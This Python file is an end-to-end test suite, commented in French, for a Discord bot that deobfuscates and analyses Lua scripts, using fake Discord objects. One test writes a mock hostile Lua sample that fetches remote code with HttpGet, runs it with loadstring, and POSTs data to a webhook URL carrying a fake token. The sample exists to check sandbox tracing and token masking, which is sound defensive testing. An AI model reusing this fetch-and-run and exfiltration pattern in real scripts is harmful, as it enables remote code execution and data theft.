#!/usr/bin/env python3
"""
Test de bout en bout du CODE DU BOT avec un faux Discord (aucune connexion reseau Discord) :
les vraies commandes /process, /deobf, /analyse, /deobf_moi sont appelees avec de fausses interactions, de
fausses pieces jointes et un faux canal de MP ; les vrais moteurs tournent.

    python3 tests/test_bot_e2e.py            # echantillon legaxyobf (rapide)

Verifie notamment : le resultat part en MP (fichier seul dans le premier message), reessais sur erreur
transitoire, MP fermes -> repli, jeton expire -> repli, /analyse (jeton de webhook jamais en clair), listes
d'ID autorises, verrou de job unique.
"""
import asyncio
import hashlib
import os
os.environ["DEOBF_PICKER"] = "0"          # ces tests visent run_job ; le selecteur de moteur a son propre test (test_identify.py)
import re
import subprocess
import sys
import time
import types
from pathlib import Path

import discord

SUITE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SUITE.parent))
os.environ.pop("DEOBF_ALLOWED_IDS", None)

from yslem_deobf_suite.cogs import deobf_cog, tools_cog as L  # noqa: E402

FAILS: list[str] = []
OWNER, STRANGER, FRIEND = 111, 222, 333


def check(cond, label):
    print(("OK   " if cond else "FAIL ") + label, flush=True)
    if not cond:
        FAILS.append(label)


def emb_text(content, embed):
    """texte lisible d'un message : contenu + embed (titre, description, champs, pied)"""
    parts = [content or ""]
    if embed is not None:
        d = embed.to_dict() if hasattr(embed, "to_dict") else dict(embed)
        parts += [d.get("title", ""), d.get("description", "")]
        parts += [f"{f['name']} {f['value']}" for f in d.get("fields", [])]
        parts += [(d.get("footer") or {}).get("text", "")]
    return "\n".join(p for p in parts if p)


def http_error(status, cls=discord.HTTPException):
    return cls(types.SimpleNamespace(status=status, reason="x"), "boom")


class FakeDM:
    def __init__(self, script=None):
        self.script = list(script or [])      # exceptions a lever, une par envoi (None = succes)
        self.sent = []

    async def send(self, content=None, files=None, embed=None, **kw):
        if self.script:
            exc = self.script.pop(0)
            if exc is not None:
                raise exc
        self.sent.append({"content": emb_text(content, embed), "files": {f.filename: f.fp.read() for f in (files or [])}})


class FakeMessage:
    def __init__(self, channel, content, files, embed=None):
        self.channel, self.content, self.files, self.edits = channel, emb_text(content, embed), files, []
        self.initial = self.content
        self.id = 9000 + len(channel.messages)

    async def edit(self, content=None, embed=None, **kw):
        self.edits.append(emb_text(content, embed))
        self.content = emb_text(content, embed)

    async def delete(self):
        pass


class FakeChannel:
    def __init__(self):
        self.messages = []

    async def send(self, content=None, files=None, embed=None, **kw):
        m = FakeMessage(self, content, {f.filename: f.fp.read() for f in (files or [])}, embed)
        self.messages.append(m)
        return m


class FakeUser:
    def __init__(self, uid=OWNER, dm=None):
        self.id = uid
        self.mention = f"<@{uid}>"
        self.dm = dm or FakeDM()
        self.dm_channel = None

    async def create_dm(self):
        self.dm_channel = self.dm
        return self.dm


class FakeFollowup:
    def __init__(self, expired=False):
        self.expired, self.sent = expired, []

    async def send(self, content=None, files=None, file=None, embed=None, ephemeral=False, wait=False, **kw):
        if self.expired:
            raise http_error(401)
        files = list(files or []) + ([file] if file is not None else [])
        self.sent.append({"content": emb_text(content, embed), "embed": embed, "ephemeral": ephemeral,
                          "files": {f.filename: f.fp.read() for f in (files or [])}})


class FakeResponse:
    def __init__(self):
        self.done, self.messages = False, []

    def is_done(self):
        return self.done

    async def defer(self, **kw):
        self.done = True

    async def send_message(self, content=None, **kw):
        self.done = True
        self.messages.append(content)


class FakeClient:
    async def is_owner(self, user):
        return user.id == OWNER


def interaction(user=None, expired=False):
    return types.SimpleNamespace(client=FakeClient(), user=user or FakeUser(), guild=None, response=FakeResponse(),
                                 followup=FakeFollowup(expired), channel=FakeChannel(), channel_id=55)


class FakeAttachment:
    def __init__(self, path: Path):
        self.data, self.filename = path.read_bytes(), path.name
        self.size = len(self.data)

    async def read(self):
        return self.data


async def amain(full: bool) -> None:
    bot = types.SimpleNamespace()
    tools = L.ToolsCog(bot)
    cog = deobf_cog.DeobfCog(bot)
    sample = FakeAttachment(SUITE / "tests" / "samples" / "legaxyobf.lua")
    real_cache_get = L._cache_get
    L._cache_get = lambda sha, moteur: None          # le cache a ses propres tests (test_discord_http.py)

    # -- 1. /process : tout dans le salon (le detail des replis est dans test_discord_http.py, avec la vraie discord.py)
    i = interaction()
    await tools.process.callback(tools, i, None, sample)
    msgs = i.channel.messages
    check(bool(msgs) and "obfuscation" in msgs[0].initial.lower(), "/process : suivi poste dans le salon (embed)")
    check(any("reste ~" in (e or "") or "✅" in (e or "") for e in msgs[0].edits),
          "/process : le suivi est edite")
    res = [m for m in msgs if any(n.startswith("deobfuscated_") for n in m.files)]
    check(bool(res) and b"protected by legaxyobf" in next(iter(res[0].files.values())), "/process : le fichier deobfusque est poste dans le salon")
    check(not i.user.dm.sent, "/process : aucun MP")

    # -- 2. deux scripts en meme temps : pas de file d'attente, les deux resultats arrivent
    i1, i2 = interaction(), interaction()
    other = FakeAttachment(SUITE / "tests" / "samples" / "legaxyobf.lua")
    other.filename = "copie.lua"
    await asyncio.gather(tools.process.callback(tools, i1, None, sample), tools.process.callback(tools, i2, None, other))
    got = [n for i_ in (i1, i2) for m in i_.channel.messages for n in m.files if n.startswith("deobfuscated_")]
    check(len(got) == 2, f"2 jobs simultanes : 2 resultats ({got})")

    # -- 3. entree vide / absente
    i = interaction()
    await tools.process.callback(tools, i, None, None)
    check(bool(i.response.messages) and "url:" in i.response.messages[0], "ni url ni fichier : message d'aide")

    # -- 7. /analyse (public) : jeton de webhook jamais en clair ; trace du bac a sable
    bad = SUITE / "tests" / "_analyse_tmp.lua"
    bad.write_text('local u="https://discord.com/api/webhooks/123456789012345678/AbCdEf_secretTOKEN-xyz0123456789"\n'
                   'print("hi")\nlocal s=game:HttpGet("https://example.com/p.lua")\nloadstring(s)()\nsetclipboard("x")\n'
                   'request({Url=u,Method="POST",Body="data"})\n')
    try:
        i = interaction(FakeUser(STRANGER))
        await tools.analyse.callback(tools, i, None, FakeAttachment(bad))
    finally:
        bad.unlink()
    sent = i.followup.sent[0] if i.followup.sent else {}
    emb = sent.get("embed")
    emb_text = "" if emb is None else " ".join([emb.title or "", emb.description or ""] + [f.name + f.value for f in emb.fields])
    report = next(iter(sent.get("files", {}).values()), b"").decode("utf-8", "replace")
    check(emb is not None and sent.get("files"), "/analyse : embed + rapport envoyes")
    check("secretTOKEN" not in emb_text and "secretTOKEN" not in report, "/analyse : jeton de webhook masque (embed et rapport)")
    check("example.com/p.lua" in report and "Appels interceptés" in report, "/analyse : le bac a sable a trace HttpGet / loadstring")
    check(all(len(f.value) <= 1024 for f in emb.fields) and len(emb.title or "") <= 256, "/analyse : limites d'embed Discord respectees")

    # -- 8. droits : proprietaire, ID autorise, administrateur
    check(await L.is_authorized(interaction(FakeUser(OWNER))), "droits : proprietaire accepte")
    check(not await L.is_authorized(interaction(FakeUser(STRANGER))), "droits : inconnu refuse")
    os.environ["DEOBF_ALLOWED_IDS"] = f"{FRIEND}, 999"
    check(await L.is_authorized(interaction(FakeUser(FRIEND))), "droits : ID de DEOBF_ALLOWED_IDS accepte")
    del os.environ["DEOBF_ALLOWED_IDS"]
    f = SUITE / "allowed_ids.txt"
    existed = f.exists()
    old = f.read_text() if existed else None
    f.write_text("# amis\n444 # moi\n")
    try:
        check(await L.is_authorized(interaction(FakeUser(444))), "droits : ID de allowed_ids.txt accepte")
    finally:
        f.write_text(old) if existed else f.unlink()
    adm = interaction(FakeUser(555))
    adm.guild = object()
    adm.user.guild_permissions = types.SimpleNamespace(administrator=True)
    check(not await L.is_authorized(adm), "droits : administrateur refuse par defaut")
    os.environ["DEOBF_ALLOW_GUILD_ADMINS"] = "1"
    check(await L.is_authorized(adm), "droits : administrateur accepte avec DEOBF_ALLOW_GUILD_ADMINS=1")
    del os.environ["DEOBF_ALLOW_GUILD_ADMINS"]
    i = interaction(FakeUser(STRANGER))
    await deobf_cog.DeobfCog.deobf_moi.callback(cog, i)
    check("222" in i.response.messages[0] and "non" in i.response.messages[0], "/deobf_moi : affiche l'ID et le refus")


def main() -> int:
    asyncio.run(amain("--full" in sys.argv))
    print()
    if FAILS:
        print(f"ECHEC : {len(FAILS)} test(s)")
        return 1
    print("TOUT OK : le bot se comporte comme annonce")
    return 0


if __name__ == "__main__":
    sys.exit(main())
